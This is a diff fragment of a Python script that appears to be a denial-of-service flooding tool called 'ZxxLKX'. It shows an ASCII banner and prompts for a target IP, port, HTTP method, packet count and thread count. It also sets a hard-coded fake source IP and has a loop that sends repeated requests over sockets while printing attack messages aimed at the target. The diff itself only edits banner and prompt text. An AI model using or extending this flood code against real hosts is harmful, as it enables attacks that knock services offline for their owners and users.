@@ -61,7 +61,7 @@ print("""
 ╚══███╔╝╚██╗██╔╝╚██╗██╔╝██║     ██║ ██╔╝╚██╗██╔╝                
   ███╔╝  ╚███╔╝  ╚███╔╝ ██║     █████╔╝  ╚███╔╝             
  ███╔╝   ██╔██╗  ██╔██╗ ██║     ██╔═██╗  ██╔██╗                     
-███████╗██╔╝ ██╗██╔╝ ██╗███████╗██║  ██╗██╔╝ ██╗                     fb;VietAnh
+███████╗██╔╝ ██╗██╔╝ ██╗███████╗██║  ██╗██╔╝ ██╗                     fb:VietAnh
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
 
 \033[35m                ╔═══════════════════════════════════════════════╗
@@ -77,8 +77,8 @@ ZxxLKX ════> Don't Leak Later.
 """)
 ip = str(input("IP : "))
 port = int(input("PORT : "))
-method_attack = str(input("METHOD (GET,POST,HEAD) : "))
-times = int(input("PACKET (BEBAS) : "))
+method_attack = str(input("METHO (get,post,) : "))
+times = int(input("PACKET (B) : "))
 threads = int(input("THREAD (1000) : "))
 fake_ip = '135.125.179.88'
 
@@ -159,7 +159,7 @@ def run():
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
-            print(f"\033[0m ZxxLKX Attack  ════>  to \033[1;35m{ip}\033[0m")
+            print(f"\033[0m   ════>  to \033[1;35m{ip}\033[0m")
         except socket.error:
             s.close()
             print(f"\033[0m HOANGVIETANHDZ  ════>  to \033[1;35m{ip}\033[0m")
